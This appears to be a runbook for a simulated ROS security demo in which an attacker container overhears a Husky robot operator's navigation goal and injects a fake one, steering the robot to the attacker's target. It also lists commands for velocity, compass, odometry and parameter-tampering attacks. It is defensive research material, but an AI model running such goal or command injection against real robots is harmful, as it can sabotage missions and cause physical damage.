# Running the Goal-Hijack Pipeline

End-to-end commands to run the full mission-hijack demo: a native Husky robot, a
remote **operator** container that sends a navigation goal, and an **attacker**
container that overhears the operator's goal and injects a fake one — so the robot
drives to the *attacker's* target instead.

- Robot: **native** on the host (a real box on the LAN).
- Operator + attacker: **containers, peers on a shared `husky_lan` network**, each
  with its own IP.
- Design: `docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md`
- Demo writeup + caveats: `docs/goal-hijack-demo.md`

> **Ordering matters:** start the attacker **before** the operator — it must be
> subscribed and `READY` before the operator's one-shot goal fires, or it misses it.

---

## Terminal 0 — one-time network + shared env

```bash
cd ~/Documents/Husky_viz

# Create the shared LAN both containers join (once; harmless if it already exists).
docker network create husky_lan 2>/dev/null || true

# The gateway of husky_lan is how the containers reach the NATIVE robot/master.
GW="$(docker network inspect husky_lan --format '{{(index .IPAM.Config 0).Gateway}}')"
echo "husky_lan gateway = $GW"      # typically 172.20.0.1
```

`$GW` (e.g. `172.20.0.1`) is used everywhere below. Each terminal exports the ROS
env itself, so if you open fresh terminals just set `GW` again from the line above.

---

## Terminal 1 — world (native)

```bash
cd ~/Documents/Husky_viz
export ROS_IP=172.20.0.1 ROS_MASTER_URI=http://172.20.0.1:11311
./load-park-stock-husky.sh
```

Wait until the park world is up in Gazebo. (Replace `172.20.0.1` with your `$GW`
if it differs.)

---

## Terminal 2 — spawn robot + move_base, idle

```bash
cd ~/Documents/Husky_viz
export ROS_IP=172.20.0.1 ROS_MASTER_URI=http://172.20.0.1:11311
./spawn-robot-idle.sh
```

Wait for: `IDLE — waiting for a remote operator goal.` The robot is now spawned at
the origin and move_base is ready.

---

## Terminal 3 — attacker lurks (START BEFORE THE OPERATOR)

```bash
cd ~/Documents/Husky_viz/attacker
export ROBOT_HOST_IP=172.20.0.1
docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 12
```

Wait for:
`Subscription connected (...). READY — now waiting for the operator's goal.`

- `--offset-y 12` = obvious hijack (robot veers well off course).
- `--offset-y 3` = subtle sabotage (looks like drift).
- Other flags: `--offset-x`, `--rate` (default 2 Hz), `--duration` (0 = until
  Ctrl-C), `--timeout` (default 60 s to wait for the operator's goal),
  `--csv <path>` (default `attack_goal_report.csv`).

---

## Terminal 4 — operator sends the real mission

```bash
cd ~/Documents/Husky_viz/operator
export ROBOT_HOST_IP=172.20.0.1
docker compose run --rm operator ./operator/operate.py --goal-x 10 --goal-y 0
```

The operator sends the robot to `(10, 0)`.

---

## What you should see

**Terminal 3 (attacker):**
```
OVERHEARD operator goal: (10.00, 0.00)
INJECTING fake goal: real=(10.00,0.00) + offset=(0.00,12.00) -> fake=(10.00,12.00)
```

**Gazebo:** the robot drives diagonally toward **(10, 12)** — NOT the `(10, 0)` the
operator sent.

**Evidence files (repo root):**
- `attack_goal_report.csv` — `real_goal=(10,0)`, `fake_goal=(10,12)`,
  `robot_x/robot_y` climbing toward the fake goal.
- `operator_run.csv` — `ref=(10,0)`: the operator *believed* it sent the robot to
  (10,0). **Operator intent ≠ robot path = the hijack.**

---

## Re-running (sim already up)

If Terminals 1–2 are still running (robot spawned), you don't need to relaunch the
world. To reset the robot to the origin between runs, restart the spawn:

```bash
# In Terminal 2: Ctrl-C spawn-robot-idle.sh, then re-run it.
export ROS_IP=172.20.0.1 ROS_MASTER_URI=http://172.20.0.1:11311
./spawn-robot-idle.sh
```

Then repeat Terminals 3 (attacker) and 4 (operator).

---

## Other attacks (same attacker container)

The attacker container also dispatches the other authorized demo attacks over the
same `husky_lan` (they only need to reach the master):

```bash
cd ~/Documents/Husky_viz/attacker
export ROBOT_HOST_IP=172.20.0.1
docker compose run --rm attacker ./attacker/attack.sh cmd_vel  --duration 8
docker compose run --rm attacker ./attacker/attack.sh compass  --yaw 1.5708
docker compose run --rm attacker ./attacker/attack.sh odom
docker compose run --rm attacker ./attacker/attack.sh param
docker compose run --rm attacker ./attacker/attack.sh goal     --offset-y 12
```

---

## Teardown

```bash
# Ctrl-C each terminal (operator/attacker exit on their own).
# In Terminal 2: Ctrl-C spawn-robot-idle.sh (tears down robot + move_base).
# In Terminal 1: Ctrl-C load-park-stock-husky.sh (tears down world + master).
# Optional: remove the shared network.
docker network rm husky_lan 2>/dev/null || true
```

---

## Honest caveats (see `docs/goal-hijack-demo.md` for detail)

- This is a **detectable rogue publish**: `rostopic info /move_base/goal` shows an
  extra publisher. That is what real attackers do (reach the trust-anyone graph and
  publish). Stealthy in-flight rewrite (MITM) is the academic path, deliberately
  not built.
- Entry (exposed master, or pivot from a breached dashboard per
  `docs/attacker-network-simulation.md` §9) is assumed, not exploited here.
